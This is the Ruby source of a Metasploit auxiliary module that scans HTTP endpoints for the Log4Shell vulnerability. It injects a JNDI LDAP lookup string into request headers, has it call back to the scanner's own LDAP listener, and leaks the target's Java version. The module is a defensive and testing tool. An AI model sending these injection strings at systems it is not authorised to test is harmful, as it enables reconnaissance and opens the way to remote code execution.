##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Log4Shell Scanner',
      'Description' => 'Check and HTTP endpoint for the Log4Shell vulnerability.',
      'Author' => [
        'Spencer McIntyre'
      ],
      'License' => MSF_LICENSE
    )

    register_options([
      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
      OptPath.new('HEADERS_FILE', [
        true, 'File containing headers to check',
        File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', 'http_headers.txt')
      ]),
      OptPath.new('URIS_FILE', [ false, 'File containing additional URIs to check' ])
    ])
  end

  def jndi_string(resource)
    "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}}"
  end

  def on_client_connect(client)
    client.extend(Net::BER::BERParser)
    Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))

    client.write(['300c02010161070a010004000400'].pack('H*'))
    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
    base_object = pdu.search_parameters[:base_object].to_s
    token, java_version = base_object.split('/', 2)

    unless (context = @tokens.delete(token)).nil?
      details = "#{context[:method]} #{normalize_uri(context[:target_uri])} (header: #{context[:header]})"
      details << " (java: #{java_version})" unless java_version.blank?
      print_good('Log4Shell found via ' + details)
      report_vuln(
        host: context[:rhost],
        port: context[:rport],
        info: "Module #{fullname} detected Log4Shell vulnerability via #{details}",
        name: name,
        refs: references
      )
    end
  ensure
    client.close
  end

  def rand_text_alpha_lower_numeric(len, bad = '')
    foo = []
    foo += ('a'..'z').to_a
    foo += ('0'..'9').to_a
    Rex::Text.rand_base(len, bad, *foo)
  end

  def run
    @tokens = {}
    start_service
    super
  ensure
    stop_service
  end

  def replicant
    obj = super
    obj.tokens = tokens
    obj
  end

  # Fingerprint a single host
  def run_host(ip)
    run_host_uri(ip, normalize_uri(target_uri)) unless target_uri.blank?

    return if datastore['URIS_FILE'].blank?

    File.open(datastore['URIS_FILE'], 'rb').lines.each do |uri|
      uri.strip!
      next if uri.start_with?('#')

      run_host_uri(ip, normalize_uri(target_uri, uri))
    end
  end

  def run_host_uri(_ip, uri)
    method = datastore['HTTP_METHOD']
    headers_file = File.open(datastore['HEADERS_FILE'], 'rb')
    headers_file.lines.each do |header|
      header.strip!
      next if header.start_with?('#')

      token = rand_text_alpha_lower_numeric(8..32)
      @tokens[token] = {
        rhost: rhost,
        rport: rport,
        target_uri: uri,
        method: method,
        header: header
      }
      send_request_raw({
        'uri' => uri,
        'method' => method,
        # https://twitter.com/404death/status/1470243045752721408
        'headers' => { header => jndi_string("#{token}/${sys:java.vendor}_${sys:java.version}") }
      })
    end
  end

  attr_accessor :tokens
end
